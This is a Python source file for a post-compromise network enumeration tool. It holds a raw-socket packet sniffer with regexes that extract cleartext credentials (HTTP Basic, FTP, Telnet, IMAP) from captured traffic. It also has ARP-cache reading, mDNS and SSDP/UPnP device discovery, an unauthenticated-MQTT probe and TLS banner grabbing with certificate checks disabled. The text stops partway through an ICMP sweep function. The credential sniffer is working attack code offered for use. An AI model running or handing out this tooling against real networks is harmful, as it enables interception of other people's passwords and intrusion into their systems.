#!/usr/bin/env python3
"""
Raw network capture and credential extraction for post-compromise enumeration.
"""
import socket
import struct
import os
import re
import threading
import queue
import time
import base64
import urllib.request
import xml.etree.ElementTree as _ET
from dataclasses import dataclass, field
from typing import Optional, List

# Protocol constants
_PROTO_ICMP = 1
_PROTO_TCP  = 6
_PROTO_UDP  = 17

# Ethernet header length (when in AF_PACKET mode)
_ETH_HDR_LEN = 14

# Cleartext-credential port set
CRED_PORTS = {21, 23, 25, 80, 110, 143, 8080}


# ---------------------------------------------------------------------------
# Header dataclasses
# ---------------------------------------------------------------------------

@dataclass
class IPHeader:
    version: int
    ihl: int
    tos: int
    total_len: int
    ttl: int
    protocol: int
    src_ip: str
    dst_ip: str

    @classmethod
    def from_bytes(cls, data: bytes) -> 'IPHeader':
        if len(data) < 20:
            raise ValueError('buffer too short for IP header')
        # Big-endian (network byte order); 4s fields are raw bytes fed to inet_ntoa
        fields = struct.unpack('!BBHHHBBH4s4s', data[:20])
        ver_ihl = fields[0]
        return cls(
            version=ver_ihl >> 4,
            ihl=ver_ihl & 0xF,
            tos=fields[1],
            total_len=fields[2],
            # fields[3] = id, fields[4] = frag offset — skipped
            ttl=fields[5],
            protocol=fields[6],
            # fields[7] = checksum — skipped
            src_ip=socket.inet_ntoa(fields[8]),
            dst_ip=socket.inet_ntoa(fields[9]),
        )

    @property
    def header_len(self) -> int:
        """IP header length in bytes."""
        return self.ihl * 4


@dataclass
class TCPHeader:
    src_port: int
    dst_port: int
    seq: int
    ack: int
    data_offset: int
    flag_fin: bool
    flag_syn: bool
    flag_rst: bool
    flag_psh: bool
    flag_ack: bool
    flag_urg: bool
    flags: int

    @classmethod
    def from_bytes(cls, data: bytes) -> 'TCPHeader':
        if len(data) < 20:
            raise ValueError('buffer too short for TCP header')
        # H=src, H=dst, I=seq, I=ack, B=doff_res, B=flags, H=window, H=chk, H=urg
        fields = struct.unpack('!HHIIBBHHH', data[:20])
        doff_byte = fields[4]
        flag_byte = fields[5]
        return cls(
            src_port=fields[0],
            dst_port=fields[1],
            seq=fields[2],
            ack=fields[3],
            data_offset=(doff_byte >> 4) & 0xF,
            flag_fin=bool(flag_byte & 0x01),
            flag_syn=bool(flag_byte & 0x02),
            flag_rst=bool(flag_byte & 0x04),
            flag_psh=bool(flag_byte & 0x08),
            flag_ack=bool(flag_byte & 0x10),
            flag_urg=bool(flag_byte & 0x20),
            flags=flag_byte,
        )

    @property
    def header_len(self) -> int:
        """TCP header length in bytes."""
        return self.data_offset * 4


@dataclass
class UDPHeader:
    src_port: int
    dst_port: int
    length: int

    @classmethod
    def from_bytes(cls, data: bytes) -> 'UDPHeader':
        if len(data) < 8:
            raise ValueError('buffer too short for UDP header')
        # H=src, H=dst, H=len, H=checksum
        fields = struct.unpack('!HHHH', data[:8])
        return cls(
            src_port=fields[0],
            dst_port=fields[1],
            length=fields[2],
        )


# ---------------------------------------------------------------------------
# Credential extractor
# ---------------------------------------------------------------------------

class CredentialExtractor:
    """Run pattern-matching credential extraction against raw TCP payloads."""

    HTTP_AUTH_RE   = re.compile(rb'Authorization:\s*Basic\s+([A-Za-z0-9+/=]+)', re.IGNORECASE)
    FTP_USER_RE    = re.compile(rb'^USER (.+)\r\n', re.MULTILINE | re.IGNORECASE)
    FTP_PASS_RE    = re.compile(rb'^PASS (.+)\r\n', re.MULTILINE | re.IGNORECASE)
    TELNET_LOGIN_RE = re.compile(rb'login:\s*(\S+)', re.IGNORECASE)
    TELNET_PASS_RE  = re.compile(rb'[Pp]assword:\s*(\S+)')
    POP3_USER_RE   = re.compile(rb'^USER (.+)\r\n', re.MULTILINE | re.IGNORECASE)
    POP3_PASS_RE   = re.compile(rb'^PASS (.+)\r\n', re.MULTILINE | re.IGNORECASE)
    IMAP_LOGIN_RE  = re.compile(
        rb'\bLOGIN\s+"?([^"\s\r\n]+)"?\s+"?([^"\s\r\n]+)"?', re.IGNORECASE
    )
    SMTP_AUTH_RE   = re.compile(rb'^AUTH LOGIN\r\n', re.MULTILINE | re.IGNORECASE)

    @classmethod
    def extract(cls, payload: bytes, src_port: int = 0, dst_port: int = 0) -> list:
        """
        Run all regexes against payload.
        Returns list of dicts: {'type': str, 'value': str, 'proto': str}
        """
        findings = []
        if not payload:
            return findings

        # HTTP Basic Auth — decode base64 to get cleartext user:pass
        for m in cls.HTTP_AUTH_RE.finditer(payload):
            b64_val = m.group(1)
            try:
                decoded = base64.b64decode(b64_val + b'==').decode('utf-8', errors='replace')
            except Exception:
                decoded = b64_val.decode('ascii', errors='replace')
            findings.append({'type': 'http_basic', 'value': decoded, 'proto': 'HTTP'})

        # FTP USER / PASS
        for m in cls.FTP_USER_RE.finditer(payload):
            findings.append({
                'type': 'ftp_user',
                'value': m.group(1).decode('utf-8', errors='replace').strip(),
                'proto': 'FTP',
            })
        for m in cls.FTP_PASS_RE.finditer(payload):
            findings.append({
                'type': 'ftp_pass',
                'value': m.group(1).decode('utf-8', errors='replace').strip(),
                'proto': 'FTP',
            })

        # Telnet login / password prompts
        for m in cls.TELNET_LOGIN_RE.finditer(payload):
            findings.append({
                'type': 'telnet_login',
                'value': m.group(1).decode('utf-8', errors='replace').strip(),
                'proto': 'TELNET',
            })
        for m in cls.TELNET_PASS_RE.finditer(payload):
            findings.append({
                'type': 'telnet_pass',
                'value': m.group(1).decode('utf-8', errors='replace').strip(),
                'proto': 'TELNET',
            })

        # IMAP LOGIN command
        for m in cls.IMAP_LOGIN_RE.finditer(payload):
            user = m.group(1).decode('utf-8', errors='replace')
            pwd  = m.group(2).decode('utf-8', errors='replace')
            findings.append({
                'type': 'imap_login',
                'value': f'{user}:{pwd}',
                'proto': 'IMAP',
            })

        return findings


# ---------------------------------------------------------------------------
# Main sniffer class
# ---------------------------------------------------------------------------

class RawSniffer:
    """
    Raw socket packet capture with credential extraction.
    Requires root / CAP_NET_RAW. Sets available=False on PermissionError.
    """

    def __init__(self, interface: str = None, timeout: float = 30.0):
        self.interface = interface
        self.timeout   = timeout
        self.available = False
        self._sock     = None
        self._eth_mode = False  # True when AF_PACKET prepends Ethernet header

        try:
            self._open_socket()
            self._sock.settimeout(1.0)
            self.available = True
        except PermissionError:
            self.available = False
        except OSError:
            self.available = False

    def _open_socket(self):
        """Open raw capture socket — AF_PACKET preferred on Linux."""
        if hasattr(socket, 'AF_PACKET'):
            # Linux: capture all IPv4 frames; ETH_P_IP = 0x0800
            self._sock = socket.socket(
                socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0800)
            )
            if self.interface:
                self._sock.bind((self.interface, 0))
            self._eth_mode = True
        else:
            # Windows / other: SOCK_RAW with IPPROTO_IP + promiscuous IOCTL
            self._sock = socket.socket(
                socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP
            )
            host = self.interface or socket.gethostbyname(socket.gethostname())
            self._sock.bind((host, 0))
            self._sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            if os.name == 'nt':
                self._sock.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)

    def _close_socket(self):
        if self._sock is None:
            return
        try:
            if os.name == 'nt' and not self._eth_mode:
                self._sock.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)
        except Exception:
            pass
        try:
            self._sock.close()
        except Exception:
            pass
        self._sock = None

    def _parse_packet(self, raw: bytes):
        """
        Parse raw buffer into (IPHeader, optional TCPHeader/UDPHeader, payload).
        Returns None on parse failure.
        """
        try:
            buf = raw
            if self._eth_mode:
                if len(buf) < _ETH_HDR_LEN + 20:
                    return None
                buf = buf[_ETH_HDR_LEN:]

            ip = IPHeader.from_bytes(buf)
            ip_payload = buf[ip.header_len:]

            if ip.protocol == _PROTO_TCP:
                if len(ip_payload) < 20:
                    return None
                tcp = TCPHeader.from_bytes(ip_payload)
                data = ip_payload[tcp.header_len:]
                return (ip, tcp, data)

            if ip.protocol == _PROTO_UDP:
                if len(ip_payload) < 8:
                    return None
                udp = UDPHeader.from_bytes(ip_payload)
                data = ip_payload[8:]
                return (ip, udp, data)

            return (ip, None, b'')
        except Exception:
            return None

    def sniff(self, duration: float = 10.0) -> dict:
        """
        Capture packets for `duration` seconds.

        Returns:
            {
                'packets': int,
                'credentials': list,
                'connections': list,   # unique (src_ip, dst_ip, dst_port) tuples
            }
        """
        if not self.available or self._sock is None:
            return {'packets': 0, 'credentials': [], 'connections': [], 'error': 'not available'}

        extractor   = CredentialExtractor()
        credentials = []
        connections = []
        seen_conns  = set()
        packet_count = 0

        deadline = time.time() + duration

        try:
            while time.time() < deadline:
                try:
                    raw, _ = self._sock.recvfrom(65535)
                except socket.timeout:
                    continue
                except OSError:
                    break

                packet_count += 1
                parsed = self._parse_packet(raw)
                if parsed is None:
                    continue

                ip_hdr, transport_hdr, payload = parsed

                if isinstance(transport_hdr, TCPHeader):
                    conn_key = (ip_hdr.src_ip, ip_hdr.dst_ip, transport_hdr.dst_port)
                    if conn_key not in seen_conns:
                        seen_conns.add(conn_key)
                        connections.append({
                            'src': ip_hdr.src_ip,
                            'dst': ip_hdr.dst_ip,
                            'port': transport_hdr.dst_port,
                            'proto': 'TCP',
                        })

                    # Credential extraction on cleartext ports
                    dst_p = transport_hdr.dst_port
                    src_p = transport_hdr.src_port
                    if (dst_p in CRED_PORTS or src_p in CRED_PORTS) and payload:
                        creds = extractor.extract(payload, src_port=src_p, dst_port=dst_p)
                        for c in creds:
                            c['src'] = ip_hdr.src_ip
                            c['dst'] = ip_hdr.dst_ip
                            c['port'] = dst_p
                            credentials.append(c)

                elif isinstance(transport_hdr, UDPHeader):
                    conn_key = (ip_hdr.src_ip, ip_hdr.dst_ip, transport_hdr.dst_port)
                    if conn_key not in seen_conns:
                        seen_conns.add(conn_key)
                        connections.append({
                            'src': ip_hdr.src_ip,
                            'dst': ip_hdr.dst_ip,
                            'port': transport_hdr.dst_port,
                            'proto': 'UDP',
                        })

        finally:
            self._close_socket()

        return {
            'packets':     packet_count,
            'credentials': credentials,
            'connections': connections[:500],   # cap to avoid huge JSON
        }

    def probe_arp_table(self) -> list:
        """
        Read the kernel ARP cache from /proc/net/arp.

        Returns list of dicts:
            {'ip': str, 'mac': str, 'interface': str, 'flags': str, 'complete': bool}

        Flag 0x2 = ATF_COM (complete entry); 0x6 = incomplete/stale.
        """
        entries = []
        arp_file = '/proc/net/arp'
        try:
            with open(arp_file, 'r') as fh:
                lines = fh.readlines()
        except OSError:
            return entries

        for line in lines[1:]:   # skip header row
            parts = line.split()
            if len(parts) < 6:
                continue
            ip_addr   = parts[0]
            flags_hex = parts[2]
            mac_addr  = parts[3]
            iface     = parts[5]
            try:
                flag_val = int(flags_hex, 16)
            except ValueError:
                flag_val = 0
            entries.append({
                'ip':        ip_addr,
                'mac':       mac_addr,
                'interface': iface,
                'flags':     flags_hex,
                'complete':  bool(flag_val & 0x2),
            })

        return entries


# ---------------------------------------------------------------------------
# Module-level convenience function
# ---------------------------------------------------------------------------

def sniff_network(duration: float = 10.0, interface: str = None) -> dict:
    """
    Convenience wrapper: open sniffer, capture for `duration` seconds, return results.

    Returns the same dict as RawSniffer.sniff(), with an extra 'arp_table' key
    containing the current ARP cache.
    """
    sniffer = RawSniffer(interface=interface, timeout=duration + 5.0)
    if not sniffer.available:
        return {
            'packets':     0,
            'credentials': [],
            'connections': [],
            'arp_table':   [],
            'error':       'raw socket unavailable (needs root / CAP_NET_RAW)',
        }

    result = sniffer.sniff(duration=duration)
    result['arp_table'] = sniffer.probe_arp_table() if sniffer._sock is None else _arp_read()
    return result


def _arp_read() -> list:
    """Read ARP table without a live RawSniffer instance."""
    tmp = RawSniffer.__new__(RawSniffer)
    tmp._sock = None
    return tmp.probe_arp_table()


# ---------------------------------------------------------------------------
# mDNS / DNS-SD constants
# ---------------------------------------------------------------------------

_QTYPE_PTR  = 12
_QTYPE_SRV  = 33
_QTYPE_TXT  = 16

_MDNS_ADDR  = '224.0.0.251'
_MDNS_PORT  = 5353

_DANGEROUS_MDNS_SERVICES = frozenset({
    '_ssh._tcp', '_vnc._tcp', '_rdp._tcp', '_ftp._tcp',
})


# ---------------------------------------------------------------------------
# MDNSDiscovery
# ---------------------------------------------------------------------------

class MDNSDiscovery:
    """
    mDNS / DNS-SD service enumeration via multicast DNS queries.

    Sends PTR queries to 224.0.0.251:5353 using SOCK_DGRAM and parses
    DNS wire-format responses including compression pointer resolution.
    Does not require root privileges.
    """

    def __init__(self, timeout: int = 3, iface: str = None):
        self.timeout = timeout
        self.iface   = iface

    # ------------------------------------------------------------------
    # DNS wire-format helpers
    # ------------------------------------------------------------------

    @staticmethod
    def _encode_name(name: str) -> bytes:
        """Encode a dotted domain name into DNS wire format."""
        out = b''
        for label in name.rstrip('.').split('.'):
            enc = label.encode('utf-8')
            out += bytes([len(enc)]) + enc
        return out + b'\x00'

    @staticmethod
    def _decode_name(data: bytes, offset: int):
        """
        Decode a DNS name at *offset* inside *data*, handling 0xC0xx compression
        pointers.  Returns (name_str, new_offset) where new_offset advances past
        the original field (pointer jumps do not move the returned offset).
        """
        labels      = []
        end_offset  = None
        visited     = set()

        while offset < len(data):
            if offset in visited:
                break
            visited.add(offset)

            b = data[offset]

            if b == 0:
                if end_offset is None:
                    end_offset = offset + 1
                break

            elif (b & 0xC0) == 0xC0:
                # Compression pointer
                if offset + 1 >= len(data):
                    if end_offset is None:
                        end_offset = offset + 2
                    break
                if end_offset is None:
                    end_offset = offset + 2
                ptr    = ((b & 0x3F) << 8) | data[offset + 1]
                offset = ptr

            else:
                # Regular label
                length  = b
                offset += 1
                if offset + length > len(data):
                    break
                labels.append(data[offset: offset + length].decode('utf-8', errors='replace'))
                offset += length

        if end_offset is None:
            end_offset = offset + 1

        return '.'.join(labels), end_offset

    def _build_query(self, name: str, qtype: int) -> bytes:
        """Build a minimal mDNS query packet."""
        # ID=0, FLAGS=0 (standard query, no recursion desired — mDNS style)
        header   = struct.pack('!HHHHHH', 0, 0x0000, 1, 0, 0, 0)
        qname    = MDNSDiscovery._encode_name(name)
        question = qname + struct.pack('!HH', qtype, 1)  # QCLASS = IN
        return header + question

    def _parse_response(self, data: bytes) -> list:
        """
        Parse a raw DNS/mDNS response packet.

        Returns list of dicts:
            {name, type, rdata (bytes), rdata_offset (int — offset inside data)}
        rdata_offset is needed to resolve any compression pointers embedded in
        RDATA (PTR, SRV target names).
        """
        if len(data) < 12:
            return []
        try:
            _id, _fl, qdcount, ancount, nscount, arcount = struct.unpack('!HHHHHH', data[:12])
        except struct.error:
            return []

        offset = 12
        for _ in range(qdcount):
            try:
                _, offset = MDNSDiscovery._decode_name(data, offset)
                offset   += 4   # QTYPE + QCLASS
            except Exception:
                return []

        records = []
        for _ in range(ancount + nscount + arcount):
            if offset >= len(data):
                break
            try:
                name, offset = MDNSDiscovery._decode_name(data, offset)
                if offset + 10 > len(data):
                    break
                rtype, _rc, _ttl, rdlength = struct.unpack('!HHIH', data[offset: offset + 10])
                offset      += 10
                rdata_offset = offset
                rdata        = data[offset: offset + rdlength]
                offset      += rdlength
                records.append({
                    'name':         name,
                    'type':         rtype,
                    'rdata':        rdata,
                    'rdata_offset': rdata_offset,
                })
            except Exception:
                break

        return records

    # ------------------------------------------------------------------
    # Record-type decoders (require full packet for compression)
    # ------------------------------------------------------------------

    def _parse_ptr(self, rec: dict, packet: bytes) -> str:
        """Decode a PTR record's RDATA (a compressed domain name)."""
        name, _ = MDNSDiscovery._decode_name(packet, rec['rdata_offset'])
        return name

    def _parse_srv(self, rec: dict, packet: bytes) -> tuple:
        """
        Decode an SRV record.
        Returns (priority, weight, port, target_name).
        """
        rdata = rec['rdata']
        if len(rdata) < 6:
            return (0, 0, 0, '')
        priority, weight, port = struct.unpack('!HHH', rdata[:6])
        target, _              = MDNSDiscovery._decode_name(packet, rec['rdata_offset'] + 6)
        return (priority, weight, port, target)

    @staticmethod
    def _parse_txt(rdata: bytes) -> dict:
        """Decode TXT record RDATA into a key→value dict."""
        result = {}
        pos    = 0
        while pos < len(rdata):
            slen = rdata[pos]
            pos += 1
            if pos + slen > len(rdata):
                break
            entry = rdata[pos: pos + slen].decode('utf-8', errors='replace')
            pos  += slen
            if '=' in entry:
                k, v = entry.split('=', 1)
                result[k] = v
            else:
                result[entry] = ''
        return result

    # ------------------------------------------------------------------
    # Socket I/O
    # ------------------------------------------------------------------

    def _query(self, name: str, qtype: int) -> list:
        """
        Send one mDNS query for *name*/*qtype* and collect raw response packets
        until the timeout expires.  Returns list of raw bytes objects.
        """
        pkt       = self._build_query(name, qtype)
        responses = []
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            try:
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
            except AttributeError:
                pass
            sock.bind(('', _MDNS_PORT))
            mreq = struct.pack('=4sI', socket.inet_aton(_MDNS_ADDR), socket.INADDR_ANY)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
            sock.sendto(pkt, (_MDNS_ADDR, _MDNS_PORT))

            deadline = time.time() + self.timeout
            while True:
                remaining = deadline - time.time()
                if remaining <= 0:
                    break
                sock.settimeout(min(remaining, 1.0))
                try:
                    data, _ = sock.recvfrom(4096)
                    responses.append(data)
                except socket.timeout:
                    break
                except OSError:
                    break
        except OSError:
            pass
        finally:
            try:
                sock.close()
            except Exception:
                pass
        return responses

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def query_all_services(self) -> list:
        """
        Send a PTR query for ``_services._dns-sd._udp.local``.
        Returns list of service-type strings (e.g. ``_http._tcp.local``).
        """
        service_types: list = []
        seen:          set  = set()

        for pkt in self._query('_services._dns-sd._udp.local', _QTYPE_PTR):
            for rec in self._parse_response(pkt):
                if rec['type'] == _QTYPE_PTR:
                    try:
                        svc = self._parse_ptr(rec, pkt)
                        if svc and svc not in seen:
                            seen.add(svc)
                            service_types.append(svc)
                    except Exception:
                        pass

        return service_types

    def query_service(self, service_type: str) -> list:
        """
        PTR query for *service_type* → enumerate instances, resolve SRV + TXT.

        Returns list of dicts:
            {'instance': str, 'host': str, 'port': int, 'txt': dict}
        """
        qname = service_type if service_type.endswith('.local') \
                else service_type.rstrip('.') + '.local'

        instances:     list = []
        seen_instances: set = set()

        for pkt in self._query(qname, _QTYPE_PTR):
            records = self._parse_response(pkt)

            ptr_targets: list = []
            srv_by_name: dict = {}
            txt_by_name: dict = {}

            for rec in records:
                if rec['type'] == _QTYPE_PTR:
                    try:
                        ptr_targets.append(self._parse_ptr(rec, pkt))
                    except Exception:
                        pass
                elif rec['type'] == _QTYPE_SRV:
                    try:
                        srv_by_name[rec['name']] = self._parse_srv(rec, pkt)
                    except Exception:
                        pass
                elif rec['type'] == _QTYPE_TXT:
                    try:
                        txt_by_name[rec['name']] = self._parse_txt(rec['rdata'])
                    except Exception:
                        pass

            for inst_name in ptr_targets:
                if inst_name in seen_instances:
                    continue
                seen_instances.add(inst_name)
                srv = srv_by_name.get(inst_name, (0, 0, 0, ''))
                txt = txt_by_name.get(inst_name, {})
                instances.append({
                    'instance': inst_name,
                    'host':     srv[3],
                    'port':     srv[2],
                    'txt':      txt,
                })

        return instances

    def discover(self) -> list:
        """
        Full mDNS/DNS-SD sweep.

        Calls query_all_services(), then query_service() for each type.
        Returns findings list; severity is MEDIUM for known dangerous service
        types (_ssh._tcp, _vnc._tcp, _rdp._tcp, _ftp._tcp), LOW otherwise.
        """
        findings = []

        for svc_type in self.query_all_services():
            svc_lower = svc_type.lower()
            severity  = 'LOW'
            for dangerous in _DANGEROUS_MDNS_SERVICES:
                if dangerous in svc_lower:
                    severity = 'MEDIUM'
                    break

            for inst in self.query_service(svc_type):
                findings.append({
                    'severity':     severity,
                    'title':        'mDNS service: ' + svc_type,
                    'service_type': svc_type,
                    'instance':     inst['instance'],
                    'host':         inst['host'],
                    'port':         inst['port'],
                    'txt':          inst['txt'],
                    'proto':        'mDNS/DNS-SD',
                })

        return findings


# ---------------------------------------------------------------------------
# SSDP / UPnP constants
# ---------------------------------------------------------------------------

_SSDP_ADDR = '239.255.255.250'
_SSDP_PORT = 1900

_SSDP_MSEARCH = (
    'M-SEARCH * HTTP/1.1\r\n'
    'HOST: 239.255.255.250:1900\r\n'
    'MAN: "ssdp:discover"\r\n'
    'MX: 1\r\n'
    'ST: ssdp:all\r\n'
    '\r\n'
)

_NS_STRIP_RE = re.compile(r'\{[^}]+\}')


# ---------------------------------------------------------------------------
# SSDPDiscovery
# ---------------------------------------------------------------------------

class SSDPDiscovery:
    """
    UPnP device discovery via SSDP M-SEARCH multicast and XML description fetch.

    Sends M-SEARCH * to 239.255.255.250:1900 over UDP, parses LOCATION headers
    from responses, and HTTP-GETs the UPnP description XML to extract device
    metadata.  Returns one MEDIUM finding per unique device.
    """

    def __init__(self, timeout: int = 3):
        self.timeout = timeout

    @staticmethod
    def _parse_ssdp_headers(raw: bytes) -> dict:
        """Parse HTTP-style SSDP response headers into an upper-case dict."""
        headers: dict = {}
        try:
            text = raw.decode('utf-8', errors='replace')
            for line in text.splitlines()[1:]:
                if ':' in line:
                    k, v = line.split(':', 1)
                    headers[k.strip().upper()] = v.strip()
        except Exception:
            pass
        return headers

    def _fetch_description(self, url: str) -> dict:
        """
        HTTP GET *url*, parse UPnP device description XML.

        Returns dict: deviceType, manufacturer, modelName, UDN, services (list).
        """
        info: dict = {
            'deviceType':   '',
            'manufacturer': '',
            'modelName':    '',
            'UDN':          '',
            'services':     [],
        }
        try:
            req = urllib.request.Request(url, headers={'User-Agent': 'Python-urllib'})
            with urllib.request.urlopen(req, timeout=self.timeout) as resp:
                raw_xml = resp.read(65536)
        except Exception:
            return info

        try:
            root = _ET.fromstring(raw_xml)

            def bare_tag(el) -> str:
                return _NS_STRIP_RE.sub('', el.tag)

            def find_text(element, tagname: str) -> str:
                for el in element.iter():
                    if bare_tag(el) == tagname and el.text:
                        return el.text.strip()
                return ''

            info['deviceType']   = find_text(root, 'deviceType')
            info['manufacturer'] = find_text(root, 'manufacturer')
            info['modelName']    = find_text(root, 'modelName')
            info['UDN']          = find_text(root, 'UDN')

            for el in root.iter():
                if bare_tag(el) == 'serviceType' and el.text:
                    info['services'].append(el.text.strip())
        except Exception:
            pass

        return info

    def discover(self) -> list:
        """
        Send M-SEARCH, collect SSDP responses, fetch XML descriptions.
        Returns findings list (one MEDIUM finding per unique LOCATION URL).
        """
        findings:       list = []
        raw_responses:  list = []
        seen_locations: set  = set()

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(self.timeout)
            sock.sendto(_SSDP_MSEARCH.encode('utf-8'), (_SSDP_ADDR, _SSDP_PORT))

            deadline = time.time() + self.timeout
            while True:
                remaining = deadline - time.time()
                if remaining <= 0:
                    break
                sock.settimeout(min(remaining, 1.0))
                try:
                    data, addr = sock.recvfrom(4096)
                    raw_responses.append((data, addr[0]))
                except socket.timeout:
                    break
                except OSError:
                    break
        except OSError:
            pass
        finally:
            try:
                sock.close()
            except Exception:
                pass

        for raw, src_ip in raw_responses:
            headers  = self._parse_ssdp_headers(raw)
            location = headers.get('LOCATION', '')
            if not location or location in seen_locations:
                continue
            seen_locations.add(location)

            desc = self._fetch_description(location)

            findings.append({
                'severity':     'MEDIUM',
                'title':        'UPnP device: ' + (desc['modelName'] or src_ip),
                'src_ip':       src_ip,
                'location':     location,
                'server':       headers.get('SERVER', ''),
                'usn':          headers.get('USN', ''),
                'deviceType':   desc['deviceType'],
                'manufacturer': desc['manufacturer'],
                'modelName':    desc['modelName'],
                'UDN':          desc['UDN'],
                'services':     desc['services'],
                'proto':        'SSDP/UPnP',
            })

        return findings


# ---------------------------------------------------------------------------
# MQTT unauthenticated-access probe
# ---------------------------------------------------------------------------

def probe_mqtt(host: str, port: int = 1883, timeout: int = 5) -> list:
    """
    Probe an MQTT broker for unauthenticated access.

    Sends an MQTT CONNECT packet (protocol level 4 = MQTT 3.1.1) with
    clean-session flag, no username/password, and a zero-length client ID.
    Reads the CONNACK response and classifies the result:

        Return code 0x00 → CRITICAL  (broker accepts unauthenticated connection)
        Return code 0x05 → LOW       (broker requires authentication)

    Returns a findings list (empty if the host is unreachable or returns no
    recognisable CONNACK).
    """
    findings: list = []

    # Variable header: protocol name (6 bytes) + level + flags + keepalive
    var_header = bytes([
        0x00, 0x04,              # UTF-8 encoded "MQTT" length prefix
        0x4D, 0x51, 0x54, 0x54, # "MQTT"
        0x04,                    # protocol level 4 (MQTT 3.1.1)
        0x02,                    # connect flags: clean session, no auth
        0x00, 0x3C,              # keep-alive: 60 s
    ])
    payload = bytes([0x00, 0x00])   # zero-length client ID
    remaining = var_header + payload

    # Remaining-length field: variable-length encoding (single byte here)
    rem_len = len(remaining)
    rl_bytes: list = []
    x = rem_len
    while True:
        digit = x % 128
        x   //= 128
        if x > 0:
            digit |= 0x80
        rl_bytes.append(digit)
        if x == 0:
            break

    connect_pkt = bytes([0x10]) + bytes(rl_bytes) + remaining

    try:
        with socket.create_connection((host, port), timeout=timeout) as sock:
            sock.sendall(connect_pkt)
            # CONNACK: fixed header (0x20, 0x02) + variable header (session, rc) = 4 bytes
            connack = b''
            while len(connack) < 4:
                chunk = sock.recv(4 - len(connack))
                if not chunk:
                    break
                connack += chunk
    except OSError:
        return findings

    if len(connack) < 4:
        return findings

    # Byte 0 = CONNACK packet type (must be 0x20)
    if connack[0] != 0x20:
        return findings

    return_code = connack[3]   # variable header: byte 1 = session present, byte 2 = return code

    if return_code == 0x00:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'MQTT broker accepts unauthenticated connection',
            'host':     host,
            'port':     port,
            'proto':    'MQTT',
            'detail':   'CONNACK return code 0x00 (Connection Accepted) — no credentials required',
        })
    elif return_code == 0x05:
        findings.append({
            'severity': 'LOW',
            'title':    'MQTT requires authentication',
            'host':     host,
            'port':     port,
            'proto':    'MQTT',
            'detail':   'CONNACK return code 0x05 (Connection Refused: not authorized)',
        })

    return findings


# ---------------------------------------------------------------------------
# Standalone network enumeration utilities
# ---------------------------------------------------------------------------

def scan_tcp_banner(host: str, port: int, timeout: float = 3.0) -> dict:
    """
    TCP-connect banner grab with service identification.

    Wraps the socket with TLS when *port* is in the well-known TLS set
    (443, 8443, 6443, 5671, 5986).

    Returns:
        {
            'port':          int,
            'banner_raw':    str   — first 256 bytes of response as hex,
            'service_guess': str   — SSH/HTTP/FTP/SMTP/IMAP/POP3/Redis/
                                     MySQL/PostgreSQL/'unknown',
            'tls':           bool  — True when TLS was attempted,
        }
    """
    import ssl as _ssl

    _TLS_PORTS = {443, 8443, 6443, 5671, 5986}
    use_tls = port in _TLS_PORTS
    result: dict = {
        'port':          port,
        'banner_raw':    '',
        'service_guess': 'unknown',
        'tls':           use_tls,
    }

    try:
        sock = socket.create_connection((host, port), timeout=timeout)
    except OSError:
        return result

    banner = b''
    try:
        if use_tls:
            ctx = _ssl.SSLContext(_ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = _ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        sock.settimeout(timeout)
        banner = sock.recv(1024)
    except OSError:
        pass
    finally:
        try:
            sock.close()
        except OSError:
            pass

    if not banner:
        return result

    result['banner_raw'] = banner[:256].hex()
    b = banner

    # Most-specific patterns first to avoid FP (e.g. SMTP before plain FTP)
    if b.startswith(b'SSH-'):
        result['service_guess'] = 'SSH'
    elif b[:4] == b'220 ' and b'SMTP' in b[:80]:
        result['service_guess'] = 'SMTP'
    elif b[:4] == b'220 ':
        result['service_guess'] = 'FTP'
    elif b.startswith(b'HTTP/'):
        result['service_guess'] = 'HTTP'
    elif b.startswith(b'* OK'):
        result['service_guess'] = 'IMAP'
    elif b.startswith(b'+OK'):
        result['service_guess'] = 'POP3'
    elif b[:5] == b'+PONG' or b[:4] == b'-ERR':
        result['service_guess'] = 'Redis'
    elif len(b) >= 3 and b[0] == 0x4a and b[1] == 0x00 and b[2] == 0x00:
        result['service_guess'] = 'MySQL'
    elif len(b) >= 4 and b[0] == 0x52 and b[1] == 0x00 and b[2] == 0x00 and b[3] == 0x00:
        result['service_guess'] = 'PostgreSQL'

    return result


def icmp_host_discovery(target_cidr: str, timeout: float = 1.0) -> list:
    """
    ICMP echo-request sweep of a CIDR block.

    Requires CAP_NET_RAW.  Falls back to TCP/80 SYN-connect when the
    privilege is absent.

    Args:
        target_cidr: CIDR notation, e.g. ``"192.168.1.0/24"``.
        timeout:     Per-host wait in seconds.

    Returns:
        List of dicts for responsive hosts::

            [{'host': str, 'latency_ms': float, 'ttl': int}, ...]

        *ttl* is 0 when the TCP fallback path was used.
    """
    live: list = []
    lock = threading.Lock()

    # CIDR parsing — stdlib socket + struct only
    try:
        net_str, prefix_str = target_cidr.split('/', 1)
        prefix = int(prefix_str)
        if not (0 <= prefix <= 32):
            return live
        net_int = struct.unpack('!I', socket.inet_aton(net_str))[0]
    except (ValueError, OSError):
        return live

    if prefix == 32:
        mask = 0xFFFFFFFF
    else:
        mask = (0xFFFFFFFF << (32 - prefix)) & 0xFFFFFFFF
    network_int  = net_int & mask
    broadcast_int = network_int | (~mask & 0xFFFFFFFF)

    hosts: list = []
    if prefix >= 31:
        # /31 (RFC 3021 point-to-point) or /32 (single host)
        for i in range(network_int, broadcast_int + 1):
            hosts.append(socket.inet_ntoa(struct.pack('!I', i)))
    else:
        # Exclude network and broadcast addresses
        for i in range(network_int + 1, broadcast_int):
            hosts.append(socket.inet_ntoa(struct.pack('!I', i)))

